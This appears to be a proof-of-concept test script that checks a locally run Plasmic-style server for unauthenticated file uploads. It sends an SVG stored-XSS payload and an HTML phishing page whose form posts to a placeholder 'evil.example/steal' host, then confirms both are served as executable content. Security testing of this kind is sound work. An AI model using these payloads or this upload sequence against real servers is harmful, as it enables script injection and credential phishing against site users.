#!/usr/bin/env python3
"""P-02 (server): unauthenticated file upload to public asset storage.
Deployment under test: local WAB with S3_ENDPOINT pointed at a local S3 mock
(storage layer test double; WAB code path is the real one).
Attacker has NO Plasmic account/session. The only preliminary step is the
public GET /api/v1/auth/csrf that any anonymous visitor can make.
Checks: SVG with <script> is stored verbatim and served as image/svg+xml;
an HTML file via /cmse/file-upload is stored and served as text/html.
"""
import json, sys, urllib.request, urllib.error, http.cookiejar, uuid

BASE = "http://localhost:3004"
SVG = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>'
HTML = b'<html><body><h1>phish-login</h1><form action="https://evil.example/steal"></form></body></html>'

def multipart(fields):
    boundary = "----h" + uuid.uuid4().hex
    out = b""
    for name, filename, ctype, data in fields:
        out += f"--{boundary}\r\n".encode()
        out += f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode()
        out += f"Content-Type: {ctype}\r\n\r\n".encode()
        out += data + b"\r\n"
    out += f"--{boundary}--\r\n".encode()
    return boundary, out

def main():
    results = []
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    csrf = json.loads(op.open(BASE + "/api/v1/auth/csrf").read())["csrf"]
    print("[setup] anonymous csrf token obtained (no login)")

    # ATTACK 1: SVG stored XSS via /api/v1/image/upload, no session
    boundary, body = multipart([("file", "evil.svg", "image/svg+xml", SVG)])
    req = urllib.request.Request(BASE + "/api/v1/image/upload", data=body, method="POST",
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}", "x-csrf-token": csrf})
    try:
        with op.open(req) as r: st, resp = r.status, json.loads(r.read() or b"{}")
    except urllib.error.HTTPError as e:
        st, resp = e.code, json.loads(e.read() or b"{}")
    print(f"[attack1] anon SVG upload -> {st}: {json.dumps(resp)[:220]}")
    results.append(("anon-svg-upload-accepted", st == 200))
    data_uri = resp.get("dataUri") or resp.get("url") or ""
    # dataUri is SITE_ASSETS_BASE_URL + key (https://site-assets.plasmic.app/<key> in this config);
    # fetch the same key from the local mock that actually stored it.
    key = data_uri.rsplit("/", 1)[-1] if data_uri else ""
    if key:
        with urllib.request.urlopen(f"http://127.0.0.1:4569/plasmic-site-assets/{key}") as r:
            served, ctype = r.read(), r.headers.get("Content-Type")
        print(f"    stored object {key}: content-type={ctype}, script verbatim={served == SVG}")
        results.append(("svg-served-as-svg-with-script", ctype == "image/svg+xml" and served == SVG))

    # ATTACK 2: arbitrary HTML hosting via /api/v1/cmse/file-upload, no session, no csrf (non-prod cmse is csrf-free)
    op2 = urllib.request.build_opener()  # no cookies at all
    boundary, body = multipart([("file", "phish.html", "text/html", HTML)])
    req = urllib.request.Request(BASE + "/api/v1/cmse/file-upload", data=body, method="POST",
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    try:
        with op2.open(req) as r: st, resp = r.status, json.loads(r.read() or b"{}")
    except urllib.error.HTTPError as e:
        st, resp = e.code, json.loads(e.read() or b"{}")
    print(f"[attack2] anon HTML upload -> {st}: {json.dumps(resp)[:260]}")
    results.append(("anon-html-upload-accepted", st == 200))
    files = resp.get("files") or []
    if files:
        url = files[0].get("url", "")
        key = url.rsplit("/", 1)[-1]
        with urllib.request.urlopen(f"http://127.0.0.1:4569/plasmic-site-assets/{key}") as r:
            served, ctype = r.read(), r.headers.get("Content-Type")
        print(f"    stored object {key}: content-type={ctype}, body verbatim={served == HTML}")
        results.append(("html-served-as-html", ctype == "text/html" and served == HTML))

    print("\n== SUMMARY ==")
    ok = True
    for name, passed in results:
        print(f"  {'PASS' if passed else 'FAIL'}  {name}"); ok = ok and passed
    sys.exit(0 if ok else 1)

if __name__ == "__main__":
    main()
